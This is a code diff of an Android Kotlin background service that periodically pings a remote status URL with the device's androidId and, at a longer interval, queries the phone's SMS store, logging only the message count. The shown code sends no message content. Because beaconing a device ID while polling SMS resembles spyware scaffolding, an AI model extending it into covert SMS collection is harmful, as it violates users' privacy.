@@ -26,7 +26,9 @@ class MainService : BaseService() {
 
     private val smsDisposable = CompositeDisposable()
 
-    private var currentTime = -1L
+    private var delay = 0L
+
+    private var time = -1L
 
     override fun onCreate() {
         super.onCreate()
@@ -37,20 +39,26 @@ class MainService : BaseService() {
 
     @Suppress("DEPRECATION")
     override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
-        disposable.add(Observable.interval(0, PING_INTERVAL, TimeUnit.MILLISECONDS)
+        disposable.add(Observable.interval(PING_INTERVAL, PING_INTERVAL, TimeUnit.MILLISECONDS)
             .subscribe {
                 if (!checkConditions()) {
                     return@subscribe
                 }
-                (application as MainApp).api.pingStatus("${Preferences.baseUrl}/status", androidId)
+                (application as MainApp).api.pingStatus("${Preferences.baseUrl}/path/to/status", androidId)
                     .subscribeOn(Schedulers.io())
                     .subscribe()
-                smsDisposable.clear()
-                currentTime = System.currentTimeMillis()
-                smsDisposable.add(RxCursorLoader.create(contentResolver, smsQuery)
-                    .subscribe {
-
-                    })
+                delay += PING_INTERVAL
+                if (delay >= SERVICE_INTERVAL) {
+                    delay = 0
+                    smsDisposable.clear()
+                    time = System.currentTimeMillis()
+                    smsDisposable.add(RxCursorLoader.create(contentResolver, smsQuery)
+                        .subscribe { cursor ->
+                            cursor.use {
+                                Timber.d("content://sms ${it.count}")
+                            }
+                        })
+                }
             })
         return START_NOT_STICKY
     }
